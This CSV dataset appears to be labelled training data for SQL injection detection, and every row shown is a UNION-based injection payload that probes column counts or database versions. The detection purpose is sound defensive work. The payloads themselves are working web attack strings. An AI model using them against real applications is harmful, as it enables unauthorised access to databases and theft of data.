id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000390,attack,union,"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",nearest_attack_euclidean,R000632,1.2155259404625494
SMOTE_000391,attack,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",nearest_attack_euclidean,R000208,0.30330047224295303
SMOTE_000392,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,0.45106273238806116
SMOTE_000393,attack,union,"1"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000600,0.5615444116083363
SMOTE_000394,attack,union,"-9629'   )    )     )   union all select 3077,3077,3077,3077#",nearest_attack_euclidean,R000671,0.13783802839008968
SMOTE_000395,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000648,0.27337305078685914
SMOTE_000396,attack,union,"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",nearest_attack_euclidean,R000526,0.7153669704390901
SMOTE_000397,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000479,0.26123459750215644
SMOTE_000398,attack,union,"1'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000465,0.2819438143208993
SMOTE_000399,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000775,0.3240913054041606
SMOTE_000400,attack,union," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000087,0.05852066855207192
SMOTE_000401,attack,union,"1'+  (  select 'zkum' where 5161  =  5161 union all select null,null,null,null#",nearest_attack_euclidean,R000749,1.1857263986613602
SMOTE_000402,attack,union,"-3865'  )   union all select 4935,4935,4935,4935,4935--",nearest_attack_euclidean,R000359,0.3070905130086735
SMOTE_000403,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000687,0.08099643041941516
SMOTE_000404,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000240,0.34154282706422473
SMOTE_000405,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000207,0.28688242761311655
SMOTE_000406,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.0
SMOTE_000407,attack,union,"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",nearest_attack_euclidean,R000504,0.36208229338183157
SMOTE_000408,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000328,0.12489892105459909
SMOTE_000409,attack,union,"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#",nearest_attack_euclidean,R000150,0.017391881950228567
SMOTE_000410,attack,union,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",nearest_attack_euclidean,R000693,0.176340546513625
SMOTE_000411,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000008,0.4869168357197656
SMOTE_000412,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000677,0.012181600418768777
SMOTE_000413,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000454,0.3047148416294315
SMOTE_000414,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R000709,0.03723562922776905
SMOTE_000415,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000164,0.17366533607713033
SMOTE_000416,attack,union,"1""  )   where 3084  =  3084 union all select null,null--",nearest_attack_euclidean,R000590,0.026528072722730722
SMOTE_000417,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000589,0.40541727787186294
SMOTE_000418,attack,union," select * from users where id  =  1 union select @||1,version  (    )   -- 1",nearest_attack_euclidean,R000041,0.9683873253968633
SMOTE_000419,attack,union,"1  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000227,0.4050579256065196
SMOTE_000420,attack,union,"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",nearest_attack_euclidean,R000751,1.2235032977550688
SMOTE_000421,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000397,0.31996512474483557
SMOTE_000422,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000178,0.07082485912353081
SMOTE_000423,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000629,0.2174173206913916
SMOTE_000424,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000767,0.5153159283223482
SMOTE_000425,attack,union,"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",nearest_attack_euclidean,R000562,0.0019143270019758402
SMOTE_000426,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000561,0.0736461008101014
SMOTE_000427,attack,union,"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",nearest_attack_euclidean,R000184,0.4061504170032343
SMOTE_000428,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.08430669110857335
SMOTE_000429,attack,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.11443832086516337
SMOTE_000430,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000164,0.108735970429728
SMOTE_000431,attack,union,"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",nearest_attack_euclidean,R000710,0.16203356199668234
SMOTE_000432,attack,union,"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",nearest_attack_euclidean,R000583,0.23828799019807026
SMOTE_000433,attack,union,"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",nearest_attack_euclidean,R000122,0.03461763041200775
SMOTE_000434,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000568,0.2446363810813282
SMOTE_000435,attack,union,"1%""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000427,0.2569118412299773
SMOTE_000436,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000770,0.4336031821190421
SMOTE_000437,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000707,0.19841327685290785
SMOTE_000438,attack,union,"1'  )   where 5276  =  5276 union all select null,null--",nearest_attack_euclidean,R000635,0.01832984773180957
SMOTE_000439,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000064,0.04869943952012147
SMOTE_000440,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000077,1.6858739404357614e-07
SMOTE_000441,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000528,1.1664879477745342
SMOTE_000442,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000126,0.07752414737548868
SMOTE_000443,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000758,0.36225872467001846
SMOTE_000444,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000149,0.18122494714213516
SMOTE_000445,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000462,0.3330795795162265
SMOTE_000446,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000617,0.33618489919459166
SMOTE_000447,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000149,5.498995776581348
SMOTE_000448,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000081,0.41798952408093276
SMOTE_000449,attack,union,"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",nearest_attack_euclidean,R000742,0.481147191663339
SMOTE_000450,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000240,0.2690671602393094
SMOTE_000451,attack,union,-8809'||  (  select 'hyzr' where 5694  =  5694 union all select 5694--,nearest_attack_euclidean,R000716,0.43143385778847904
SMOTE_000452,attack,union,"1"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000600,1.3238100113203597
SMOTE_000453,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.05088919836796763
SMOTE_000454,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000123,0.09364046235235998
SMOTE_000455,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000666,0.09958506752303238
SMOTE_000456,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R000190,0.46258934954735714
SMOTE_000457,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000156,0.21520546021999895
SMOTE_000458,attack,union,"1   )    )    as cvid where 4381  =  4381 union all select null,null--",nearest_attack_euclidean,R000674,0.9942506510277223
SMOTE_000459,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000247,0.4999070681577463
SMOTE_000460,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000620,0.18351474739724657
SMOTE_000461,attack,union,"-8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793#",nearest_attack_euclidean,R000580,0.5541477593856728
SMOTE_000462,attack,union," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",nearest_attack_euclidean,R000048,0.07922109890769775
SMOTE_000463,attack,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",nearest_attack_euclidean,R000451,0.029382948179208383
SMOTE_000464,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000261,0.9985220617062288
SMOTE_000465,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000067,0.30399486546406534
SMOTE_000466,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000107,2.1995218366684877
SMOTE_000467,attack,union,"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",nearest_attack_euclidean,R000571,0.2710621096226774
SMOTE_000468,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000153,0.23565900370579992
SMOTE_000469,attack,union,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",nearest_attack_euclidean,R000160,0.0
SMOTE_000470,attack,union,"1"" union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000273,0.11842822925353323
SMOTE_000471,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000738,0.5429696932404544
SMOTE_000472,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000240,1.0248252194428469
SMOTE_000473,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,0.2860530587216305
SMOTE_000474,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000209,0.32248597346448193
SMOTE_000475,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000485,0.31765165731703937
SMOTE_000476,attack,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",nearest_attack_euclidean,R000734,0.23775672877762621
SMOTE_000477,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000175,0.6323865741825534
SMOTE_000478,attack,union,"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",nearest_attack_euclidean,R000474,0.3359119419495762
SMOTE_000479,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000177,1.1259507556727553
SMOTE_000480,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000775,0.46698294728406003
SMOTE_000481,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000011,0.19178993634691419
SMOTE_000482,attack,union,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",nearest_attack_euclidean,R000475,9.992625813887303e-06
SMOTE_000483,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000166,0.40717494636291945
SMOTE_000484,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000729,0.5695894221993966
SMOTE_000485,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000738,0.44260645032381263
SMOTE_000486,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000172,0.9292149184844065
SMOTE_000487,attack,union," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",nearest_attack_euclidean,R000085,0.2417455922046324
SMOTE_000488,attack,union,"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",nearest_attack_euclidean,R000534,0.4674730031197648
SMOTE_000489,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000081,0.3410244285743099
SMOTE_000490,attack,union,"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#",nearest_attack_euclidean,R000292,0.24693023482257162
SMOTE_000491,attack,union,"-7544""   )    )    union all select 3808,3808,3808,3808--",nearest_attack_euclidean,R000452,0.061211962640186544
SMOTE_000492,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000414,0.11700463004994267
SMOTE_000493,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000013,0.07410295052230863
SMOTE_000494,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000247,0.26500150416251256
SMOTE_000495,attack,union," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.35289438626112263
SMOTE_000496,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000177,0.9684612560848921
SMOTE_000497,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000261,0.49080767513341556
SMOTE_000498,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000576,0.6613557088590679
SMOTE_000499,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000700,0.13391730164916266
SMOTE_000500,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000565,0.08405350080876735
